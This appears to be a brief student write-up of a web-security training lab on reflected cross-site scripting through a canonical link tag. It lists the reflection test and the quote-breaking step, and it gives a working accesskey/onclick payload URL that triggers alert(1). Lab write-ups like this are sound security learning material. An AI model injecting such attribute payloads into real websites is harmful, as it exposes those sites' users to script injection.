Lab: Reflected XSS in canonical link tag

This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

ALT+SHIFT+X
CTRL+ALT+X
Alt+X

Please note that the intended solution to this lab is only possible in Chrome.


Analys:
    1. Trying to find where's input goes by additing <LABLINK>/?hgfhgfh

## Result:
    <link rel="canonical" href='https://0a6e00a604cff2e9805a3acb00300084.web-security-academy.net/?hgfhgfh'/>
    It mirrored into head of cannonical <link> in <head>

    2. Trying to break through href by adding single quotes: <LAB-ID>/?'onclick=alert(1)'
## Result:
    Success

    3. Crafting an exploit that depends on user's input [https://0a6e00a604cff2e9805a3acb00300084.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)] -> Lab Solved